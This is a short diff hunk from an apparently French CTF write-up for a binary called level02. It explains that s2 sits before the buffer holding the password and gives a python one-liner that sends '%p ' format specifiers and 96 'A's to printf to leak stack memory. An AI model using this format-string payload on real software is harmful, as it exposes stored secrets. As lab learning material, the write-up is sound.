@@ -16,7 +16,7 @@ Dans les sources:
 
 s2[96] est avant ptr[] (ou est stocke .pass) dans la memoire, on va tenter de print 96 'A' dans s2 et des '%x ' dans s[96] car s est envoye a printf
 
-bash:
+# bash:
 
 	> python -c "print '%p '*32 + '\n' + 'A'*96" | ./level02
 ===== [ Secure Access System v1.0 ] =====
